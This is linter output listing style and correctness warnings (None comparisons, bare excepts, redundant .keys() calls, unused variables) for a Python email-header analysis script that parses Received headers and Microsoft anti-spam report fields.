     |
help: Remove `.keys()`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7500:17
     |
7498 |                     if len(res) > 0:
7499 |                         obj["host"] = res
7500 |                 except:
     |                 ^^^^^^
7501 |                     pass
     |

E711 Comparison to `None` should be `cond is None`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7507:33
     |
7505 |                     r"\[?(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\]?", obj["host2"]
7506 |                 )
7507 |                 if obj["ip"] == None or len(obj["ip"]) == 0 and match:
     |                                 ^^^^
7508 |                     obj["ip"] = match.group(1)
7509 |                     obj["host2"] = ""
     |
help: Replace with `cond is None`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7511:13
     |
7509 |                       obj["host2"] = ""
7510 |
7511 | /             if len(obj["host2"]) == 0:
7512 | |                 if obj["ip"] != None and len(obj["ip"]) > 0:
     | |____________________________________________________________^
7513 |                       try:
7514 |                           res = SMTPHeadersAnalysis.gethostbyaddr(obj["ip"])
     |
help: Combine `if` statements using `and`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7512:33
     |
7511 |             if len(obj["host2"]) == 0:
7512 |                 if obj["ip"] != None and len(obj["ip"]) > 0:
     |                                 ^^^^
7513 |                     try:
7514 |                         res = SMTPHeadersAnalysis.gethostbyaddr(obj["ip"])
     |
help: Replace with `cond is not None`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7517:21
     |
7515 |                         if len(res) > 0:
7516 |                             obj["host2"] = res
7517 |                     except:
     |                     ^^^^^^
7518 |                         obj["host2"] = self.logger.colored("NXDomain", "red")
     |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7529:12
     |
7527 |             return {}
7528 |
7529 |         if "id" in parsed.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^
7530 |             ver = parsed["id"].strip()
7531 |             obj["ver"] = ver
     |
help: Remove `.keys()`

F405 `tzutc` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7536:64
     |
7534 |         if pos != -1:
7535 |             ts = received[pos + 1 :].strip()
7536 |             obj["timestamp"] = str(parser.parse(ts).astimezone(tzutc()))
     |                                                                ^^^^^
7537 |
7538 |         for m in re.finditer(r"(?<!\+\d{4}\s)\(([^\)]+)\)", received[extrapos:], re.I):
     |

B007 Loop control variable `k1` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7544:21
     |
7542 |             if match:
7543 |                 skip = False
7544 |                 for k1, v1 in obj["parsed"].items():
     |                     ^^
7545 |                     if type(v1) != str:
7546 |                         continue
     |
help: Rename unused `k1` to `_k1`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7545:24
     |
7543 |                 skip = False
7544 |                 for k1, v1 in obj["parsed"].items():
7545 |                     if type(v1) != str:
     |                        ^^^^^^^^^^^^^^^
7546 |                         continue
7547 |                     if match.group(1) in v1:
     |

N806 Variable `hostnameExposed` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7559:9
     |
7558 |         tldextracted = tldextract.extract(obj["host"])
7559 |         hostnameExposed = False
     |         ^^^^^^^^^^^^^^^
7560 |
7561 |         if (
     |

N806 Variable `hostnameExposed` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7566:13
     |
7564 |             and len(tldextracted.domain) == 0
7565 |         ):
7566 |             hostnameExposed = True
     |             ^^^^^^^^^^^^^^^
7567 |
7568 |         elif (
     |

N806 Variable `hostnameExposed` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7576:13
     |
7574 |                 f"{tldextracted.domain}.{tldextracted.suffix}"
7575 |             )
7576 |             hostnameExposed = res == ""
     |             ^^^^^^^^^^^^^^^
7577 |
7578 |         if hostnameExposed:
     |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7586:13
     |
7584 |         obj["_raw"] = received
7585 |
7586 |         for k in obj.keys():
     |             ^^^^^^^^^^^^^^^
7587 |             if type(obj[k]) == str:
7588 |                 obj[k] = obj[k].strip()
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7587:16
     |
7586 |         for k in obj.keys():
7587 |             if type(obj[k]) == str:
     |                ^^^^^^^^^^^^^^^^^^^
7588 |                 obj[k] = obj[k].strip()
     |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7591:16
     |
7590 |         for k in ["with", "by", "id", "via"]:
7591 |             if k in parsed.keys():
     |                ^^^^^^^^^^^^^^^^^^
7592 |                 ver = parsed[k].strip()
7593 |                 if ver.find(" (") != -1:
     |
help: Remove `.keys()`

F841 Local variable `val0` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7607:13
     |
7605 |             + SMTPHeadersAnalysis.Header_Keywords_That_May_Contain_Spam_Info
7606 |         ):
7607 |             val0 = val
     |             ^^^^
7608 |             val = re.sub(
7609 |                 r"(" + re.escape(item) + r")",
     |
help: Remove assignment to unused variable `val0`

N806 Variable `numReceived` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7651:9
     |
7649 |             )
7650 |
7651 |         numReceived = 0
     |         ^^^^^^^^^^^
7652 |         for i in range(len(received), 0, -1):
7653 |             r = received[i - 1][2]
     |

N806 Variable `numReceived` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7656:13
     |
7654 |             r = SMTPHeadersAnalysis.flattenLine(r)
7655 |
7656 |             numReceived += 1
     |             ^^^^^^^^^^^
7657 |             obj = self.parseReceived(r, numReceived)
     |

SIM113 Use `enumerate()` for index variable `numReceived` in `for` loop
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7656:13
     |
7654 |             r = SMTPHeadersAnalysis.flattenLine(r)
7655 |
7656 |             numReceived += 1
     |             ^^^^^^^^^^^^^^^^
7657 |             obj = self.parseReceived(r, numReceived)
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7659:16
     |
7657 |             obj = self.parseReceived(r, numReceived)
7658 |
7659 |             if "ver" in obj.keys() and len(obj["ver"]) > 0:
     |                ^^^^^^^^^^^^^^^^^^^
7660 |                 vers = SMTPHeadersAnalysis.parseExchangeVersion(obj["ver"])
7661 |                 if vers != None:
     |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7661:28
     |
7659 |             if "ver" in obj.keys() and len(obj["ver"]) > 0:
7660 |                 vers = SMTPHeadersAnalysis.parseExchangeVersion(obj["ver"])
7661 |                 if vers != None:
     |                            ^^^^
7662 |                     obj["ver"] = self.logger.colored(str(vers), "magenta")
     |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is None`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7664:38
     |
7662 |                     obj["ver"] = self.logger.colored(str(vers), "magenta")
7663 |
7664 |             if obj and (obj["ip"] == None or len(obj["ip"]) == 0):
     |                                      ^^^^
7665 |                 if obj["host"] != None and len(obj["host"]) > 0:
7666 |                     try:
     |
help: Replace with `cond is None`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7665:35
     |
7664 |             if obj and (obj["ip"] == None or len(obj["ip"]) == 0):
7665 |                 if obj["host"] != None and len(obj["host"]) > 0:
     |                                   ^^^^
7666 |                     try:
7667 |                         obj["ip"] = SMTPHeadersAnalysis.gethostbyname(obj["host"])
     |
help: Replace with `cond is not None`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7668:21
     |
7666 |                     try:
7667 |                         obj["ip"] = SMTPHeadersAnalysis.gethostbyname(obj["host"])
7668 |                     except:
     |                     ^^^^^^
7669 |                         pass
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7671:33
     |
7669 |                         pass
7670 |
7671 |                 if obj["ip"] != None and len(obj["ip"]) > 0:
     |                                 ^^^^
7672 |                     match = re.match(
7673 |                         r"(?P<host>[^\s]+)\.?\s+\[(?P<ip>[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\]",
     |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7736:30
     |
7734 |                 )
7735 |
7736 |             if elem["ip"] != None and len(elem["ip"]) > 0:
     |                              ^^^^
7737 |                 if elem["ip"][0] == "[" and elem["ip"][-1] == "]":
7738 |                     elem["ip"] = elem["ip"][1:-1]
     |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7761:37
     |
7759 |                     )
7760 |
7761 |             if elem["timestamp"] != None:
     |                                     ^^^^
7762 |                 result += (
7763 |                     iindent
     |
help: Replace with `cond is not None`

SIM109 Use `vv2 in (v1, v2)` instead of multiple equality comparisons
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7796:41
     |
7794 |                         n = 0
7795 |                     vv2 = vv.replace("<", "").replace(">", "")
7796 |                     if kk == "for" and (vv2 == v1 or vv2 == v2):
     |                                         ^^^^^^^^^^^^^^^^^^^^^^
7797 |                         continue
     |
help: Replace with `vv2 in (v1, v2)`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7804:16
     |
7802 |                     )
7803 |
7804 |             if "extra" in elem.keys() and len(elem["extra"]) > 0:
     |                ^^^^^^^^^^^^^^^^^^^^^^
7805 |                 result += iindent + indent * (num + 3) + "extra: \n"
7806 |                 for vv in elem["extra"]:
     |
help: Remove `.keys()`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7940:12
     |
7938 |             parsed[k] = v
7939 |
7940 |         if "BCL" in parsed.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^
7941 |             scl = int(parsed["BCL"])
7942 |             tmp = ""
     |
help: Remove `.keys()`

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8025:16
     |
8023 |                 continue
8024 |             k, v = entry.split(":")
8025 |             if k not in parsed.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^
8026 |                 parsed[k] = v
     |
help: Remove `.keys()`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8028:12
     |
8026 |                 parsed[k] = v
8027 |
8028 |         if "CIP" in parsed.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^
8029 |             res = ""
8030 |             if self.resolve:
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8040:16
     |
8038 |             elem = None
8039 |
8040 |             if k.upper() in SMTPHeadersAnalysis.Forefront_Antispam_Report.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8041 |                 elem = SMTPHeadersAnalysis.Forefront_Antispam_Report[k.upper()]
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8043:18
     |
8041 |                 elem = SMTPHeadersAnalysis.Forefront_Antispam_Report[k.upper()]
8042 |
8043 |             elif k in SMTPHeadersAnalysis.Forefront_Antispam_Report.keys():
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8044 |                 elem = SMTPHeadersAnalysis.Forefront_Antispam_Report[k]
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8052:20
     |
8050 |                 tmp = f"- {k0}: " + elem[0] + "\n"
8051 |
8052 |                 if type(elem[1]) == dict:
     |                    ^^^^^^^^^^^^^^^^^^^^^
8053 |                     for va in vals:
8054 |                         if va in elem[1].keys():
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8054:28
     |
8052 |                 if type(elem[1]) == dict:
8053 |                     for va in vals:
8054 |                         if va in elem[1].keys():
     |                            ^^^^^^^^^^^^^^^^^^^^
8055 |                             found = True
8056 |                             tmp += f"\t- {va}: {elem[1][va]}\n"
     |
help: Remove `.keys()`

N806 Variable `usedRE` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8069:9
     |
8067 |                     result += tmp + "\n"
8068 |
8069 |         usedRE = False
     |         ^^^^^^
8070 |         for k in ["SFS", "RULEID", "ENG"]:
8071 |             if k in parsed.keys():
     |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8071:16
     |
8069 |         usedRE = False
8070 |         for k in ["SFS", "RULEID", "ENG"]:
8071 |             if k in parsed.keys():
     |                ^^^^^^^^^^^^^^^^^^
8072 |                 res = ""
8073 |                 rules = [x.replace("(", "") for x in parsed[k].split(")")]
     |
help: Remove `.keys()`

F841 Local variable `res` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8072:17
     |
8070 |         for k in ["SFS", "RULEID", "ENG"]:
8071 |             if k in parsed.keys():
8072 |                 res = ""
     |                 ^^^
8073 |                 rules = [x.replace("(", "") for x in parsed[k].split(")")]
     |
help: Remove assignment to unused variable `res`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8088:25
     |
8086 |                       r2 = f"({r})"
8087 |                       if (
8088 | /                         r
8089 | |                         in SMTPHeadersAnalysis.Anti_Spam_Rules_ReverseEngineered.keys()
     | |_______________________________________________________________________________________^
8090 |                       ):
8091 |                           e = SMTPHeadersAnalysis.Anti_Spam_Rules_ReverseEngineered[r]
     |
help: Remove `.keys()`

N806 Variable `usedRE` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8093:25
     |
8091 |                         e = SMTPHeadersAnalysis.Anti_Spam_Rules_ReverseEngineered[r]
8092 |                         tmp += f'\t- {r2: <15} - {self.logger.colored(e, "yellow")}\n'
8093 |                         usedRE = True
     |                         ^^^^^^
8094 |                     else:
8095 |                         tmp += f"\t- {r2}\n"
     |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8121:16
     |
8120 |         for k, v in sclpcl.items():
8121 |             if k in parsed.keys():
     |                ^^^^^^^^^^^^^^^^^^
8122 |                 addscl = True
8123 |                 scl = int(parsed[k])
     |
help: Remove `.keys()`

N806 Variable `headersFound` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8168:9
     |
8167 |     def testSenderAddress(self):
8168 |         headersFound = set()
     |         ^^^^^^^^^^^^
8169 |
8170 |         senderHeaders = (
     |

N806 Variable `senderHeaders` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8170:9
     |
8168 |         headersFound = set()
8169 |
8170 |         senderHeaders = (
     |         ^^^^^^^^^^^^^
8171 |             "MAIL FROM",
8172 |             "mail-from",
     |

B007 Loop control variable `num` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8182:13
     |
8180 |         addresses = []
8181 |
8182 |         for num, header, value in self.headers:
     |             ^^^
8183 |             if header.lower() not in [x.lower() for x in senderHeaders]:
8184 |                 continue
     |
help: Rename unused `num` to `_num`

B007 Loop control variable `value` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8182:26
     |
8180 |         addresses = []
8181 |
8182 |         for num, header, value in self.headers:
     |                          ^^^^^
8183 |             if header.lower() not in [x.lower() for x in senderHeaders]:
8184 |                 continue
     |
help: Rename unused `value` to `_value`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8224:9
     |
8222 |           result = f"\n- Identified sender addresses ({num1}):\n" + result
8223 |
8224 | /         if len(addresses) > 0:
8225 | |             if not addresses.count(addresses[0]) == len(addresses):
     | |___________________________________________________________________^
8226 |                   result += self.logger.colored(
8227 |                       f"\n\n- WARNING! Not all sender addresses match each other - potential Mail Spoofing!\n",
     |
help: Combine `if` statements using `and`

SIM201 Use `addresses.count(addresses[0]) != len(addresses)` instead of `not addresses.count(addresses[0]) == len(addresses)`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8225:16
     |
8224 |         if len(addresses) > 0:
8225 |             if not addresses.count(addresses[0]) == len(addresses):
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8226 |                 result += self.logger.colored(
8227 |                     f"\n\n- WARNING! Not all sender addresses match each other - potential Mail Spoofing!\n",
     |
help: Replace with `!=` operator

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8227:21
     |
8225 |             if not addresses.count(addresses[0]) == len(addresses):
8226 |                 result += self.logger.colored(
8227 |                     f"\n\n- WARNING! Not all sender addresses match each other - potential Mail Spoofing!\n",
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8228 |                     "red",
8229 |                 )
     |
help: Remove extraneous `f` prefix

F841 Local variable `found` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8271:9
     |
8269 |         result = ""
8270 |         tmp = ""
8271 |         found = False
     |         ^^^^^
8272 |         num0 = 0
8273 |         shown = set()
     |
help: Remove assignment to unused variable `found`

B007 Loop control variable `num` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8275:13
     |
8273 |         shown = set()
8274 |
8275 |         for num, header, value in self.headers:
     |             ^^^
8276 |             v = SMTPHeadersAnalysis.flattenLine(value)
8277 |             m = re.search(r"\=\?[a-z0-9\-]+\?Q\?", v, re.I)
     |
help: Rename unused `num` to `_num`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8284:20
     |
8283 |                 value_decoded = emailheader.decode_header(value)[0][0]
8284 |                 if type(value_decoded) == bytes:
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8285 |                     value_decoded = value_decoded.decode(errors="ignore")
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8289:24
     |
8287 |                 hhh = self.logger.colored(header, "magenta")
8288 |                 tmp += f"\t({num0:02}) Header: {hhh}\n"
8289 |                 tmp += f"\t     Value:\n\n"
     |                        ^^^^^^^^^^^^^^^^^^^^
8290 |                 tmp += value_decoded + "\n\n"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8296:28
     |
8294 |                         base64.b64decode(value_decoded.encode())
8295 |                     )
8296 |                     tmp += f"\t     Base64 decoded Hexdump:\n\n"
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8297 |                     tmp += x
8298 |                     tmp += "\n\n\n"
     |
help: Remove extraneous `f` prefix

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8299:17
     |
8297 |                     tmp += x
8298 |                     tmp += "\n\n\n"
8299 |                 except:
     |                 ^^^^^^
8300 |                     pass
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8324:12
     |
8323 |         value = emailheader.decode_header(value)[0][0]
8324 |         if type(value) == bytes:
     |            ^^^^^^^^^^^^^^^^^^^^
8325 |             value = value.decode(errors="ignore")
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8334:20
     |
8333 |         if self.decode_all:
8334 |             tmp += f"\n\n\t- Base64 decoded Hexdump:\n\n"
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8335 |             tmp += SMTPHeadersAnalysis.hexdump(base64.b64decode(value))
8336 |             tmp += "\n\n\n"
     |
help: Remove extraneous `f` prefix

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8362:16
     |
8360 |                 continue
8361 |             k, v = entry.split(":")
8362 |             if k not in parsed.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^
8363 |                 parsed[k.lower()] = v
     |
help: Remove `.keys()`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8366:13
     |
8365 |         if (
8366 |             "ucf" in parsed.keys()
     |             ^^^^^^^^^^^^^^^^^^^^^^
8367 |             and "dest" in parsed.keys()
8368 |             and parsed["ucf"] == "1"
     |
help: Remove `.keys()`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8367:17
     |
8365 |         if (
8366 |             "ucf" in parsed.keys()
8367 |             and "dest" in parsed.keys()
     |                 ^^^^^^^^^^^^^^^^^^^^^^^
8368 |             and parsed["ucf"] == "1"
8369 |             and parsed["dest"] == "J"
     |
help: Remove `.keys()`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8372:17
     |
8370 |         ):
8371 |             result += self.logger.colored(
8372 |                 f"- WARNING: User created a custom mail rule that moved this message to JUNK folder!\n",
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8373 |                 "red",
8374 |             )
     |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8379:16
     |
8377 |             elem = None
8378 |
8379 |             if k.upper() in SMTPHeadersAnalysis.Forefront_Antispam_Delivery.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8380 |                 elem = SMTPHeadersAnalysis.Forefront_Antispam_Delivery[k.upper()]
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8382:18
     |
8380 |                 elem = SMTPHeadersAnalysis.Forefront_Antispam_Delivery[k.upper()]
8381 |
8382 |             elif k in SMTPHeadersAnalysis.Forefront_Antispam_Delivery.keys():
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8383 |                 elem = SMTPHeadersAnalysis.Forefront_Antispam_Delivery[k]
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8391:20
     |
8389 |                 tmp = f"- {k0}: " + elem[0] + "\n"
8390 |
8391 |                 if type(elem[1]) == dict:
     |                    ^^^^^^^^^^^^^^^^^^^^^
8392 |                     for va in vals:
8393 |                         if va in elem[1].keys():
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8393:28
     |
8391 |                 if type(elem[1]) == dict:
8392 |                     for va in vals:
8393 |                         if va in elem[1].keys():
     |                            ^^^^^^^^^^^^^^^^^^^^
8394 |                             found = True
8395 |                             tmp += f"\t- {va}: {elem[1][va]}\n"
     |
help: Remove `.keys()`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8409:16
     |
8408 |         for k in ["SFS", "RULEID", "ENG"]:
8409 |             if k.lower() in parsed.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^
8410 |                 res = ""
8411 |                 rules = [x.replace("(", "") for x in parsed[k.lower()].split(")")]
     |
help: Remove `.keys()`

F841 Local variable `res` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8410:17
     |
8408 |         for k in ["SFS", "RULEID", "ENG"]:
8409 |             if k.lower() in parsed.keys():
8410 |                 res = ""
     |                 ^^^
8411 |                 rules = [x.replace("(", "") for x in parsed[k.lower()].split(")")]
     |
help: Remove assignment to unused variable `res`

N806 Variable `usedRE` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8420:17
     |
8419 |                 rules.sort()
8420 |                 usedRE = False
     |                 ^^^^^^
8421 |
8422 |                 for r in rules:
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8428:25
     |
8426 |                       r2 = f"({r})"
8427 |                       if (
8428 | /                         r
8429 | |                         in SMTPHeadersAnalysis.Anti_Spam_Rules_ReverseEngineered.keys()
     | |_______________________________________________________________________________________^
8430 |                       ):
8431 |                           e = SMTPHeadersAnalysis.Anti_Spam_Rules_ReverseEngineered[r]
     |
help: Remove `.keys()`

N806 Variable `usedRE` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8433:25
     |
8431 |                         e = SMTPHeadersAnalysis.Anti_Spam_Rules_ReverseEngineered[r]
8432 |                         tmp += f"\t- {r2: <15} - {e}\n"
8433 |                         usedRE = True
     |                         ^^^^^^
8434 |                     else:
8435 |                         tmp += f"\t- {r2}\n"
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8492:18
     |
8490 |         value = value.strip()
8491 |
8492 |         result = f"- This message was marked with Bypass Focused Inbox specification:\n"
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8493 |
8494 |         if value.lower() == "true" or value.lower() == "yes":
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8495:23
     |
8494 |         if value.lower() == "true" or value.lower() == "yes":
8495 |             result += f"\t- The message will get to Inbox folder instead of Focused Inbox folder.\n"
     |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8496 |         else:
8497 |             result += f"\t- The message might get into Focused Inbox folder.\n"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8497:23
     |
8495 |             result += f"\t- The message will get to Inbox folder instead of Focused Inbox folder.\n"
8496 |         else:
8497 |             result += f"\t- The message might get into Focused Inbox folder.\n"
     |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8498 |
8499 |         return {
     |
help: Remove extraneous `f` prefix

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8515:180
     |
8513 | ΓÇª
8514 | ΓÇªor Office365.
8515 | ΓÇªtrue sender IP and not the hop before Exchange Online Protection. 
     |                                                                   ^
8516 | ΓÇª
8517 | ΓÇª
     |
help: Remove trailing whitespace

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8522:18
     |
8520 | ΓÇªe = SMTPHeadersAnalysis.flattenLine(value).strip()
8521 | ΓÇª
8522 | ΓÇªlt = f"- Office365 Enhanced Filtering for Connector was enabled facilitating Exchange Online Protection / MS Defender for Office365 protection.\n"
